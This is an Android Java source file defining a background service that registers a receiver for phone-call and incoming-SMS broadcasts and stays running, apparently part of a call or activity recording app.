package com.startapps.activityrec.services;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class SvcCallsService extends Service
{
	//private Context ctx;
	private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
	private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
	private static final String ACTION_SMS_IN = "android.provider.Telephony.SMS_RECEIVED";
	private RegisterPhonecallsReceiver brCalls;
	private boolean running = false;
	
	@Override
	public IBinder onBind(Intent intent)
	{
		return null;
	}
	
	@Override
	public void onCreate()
	{
		super.onCreate();
		//ctx = getApplicationContext();
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId)
	{
		final IntentFilter filter = new IntentFilter();
		filter.addAction(ACTION_OUT);		
		filter.addAction(ACTION_IN);
		filter.addAction(ACTION_SMS_IN);
		filter.setPriority(999);
		//filter.addAction(android.telephony.TelephonyManager.ACTION_PHONE_STATE_CHANGED);
		brCalls = new RegisterPhonecallsReceiver();
		registerReceiver(brCalls, filter);
		running = true;
		return (START_STICKY);		
	}
	
	@Override
	public void onDestroy()
	{
		if (running)
		{
			unregisterReceiver(brCalls);
			running = false;
		}
	}
	
}
